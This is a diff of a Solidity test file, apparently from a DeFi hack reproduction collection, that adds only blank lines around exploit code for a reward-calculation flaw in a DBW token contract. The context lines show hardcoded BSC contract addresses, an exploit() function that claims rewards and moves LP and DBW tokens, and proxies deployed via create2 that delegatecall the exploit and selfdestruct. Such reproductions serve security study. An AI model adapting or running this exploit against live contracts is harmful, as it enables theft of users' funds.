@@ -17,12 +17,15 @@ import "./../interface.sol";
 // https://github.com/SunWeb3Sec/DeFiHackLabs/tree/main#20221001-rl-token---incorrect-reward-calculation
 
 interface IDBW is IERC20 {
+
     function pledge_lp(uint256 count) external;
     function getStaticIncome() external;
     function redemption_lp(uint256 count) external;
+
 }
 
 contract ContractTest is Test {
+
     IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
     IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
@@ -157,9 +160,11 @@ contract ContractTest is Test {
             addr := create2(0, add(bytecode, 0x20), mload(bytecode), _salt)
         }
     }
+
 }
 
 contract claimRewardImpl is Test {
+
     function exploit() public {
         IDBW DBW = IDBW(0xBF5BAea5113e9EB7009a6680747F2c7569dfC2D6);
         Uni_Pair_V2 Pair = Uni_Pair_V2(0x69D415FBdcD962D96257056f7fE382e432A3b540);
@@ -173,12 +178,15 @@ contract claimRewardImpl is Test {
         Pair.transfer(msg.sender, LPAmount);
         DBW.transfer(address(Pair), DBW.balanceOf(address(this)));
     }
+
 }
 
 contract miniProxy {
+
     constructor(address claimRewardImpl) {
         (bool success,) = claimRewardImpl.delegatecall(abi.encodeWithSignature("exploit()"));
         require(success);
         selfdestruct(payable(tx.origin));
     }
+
 }
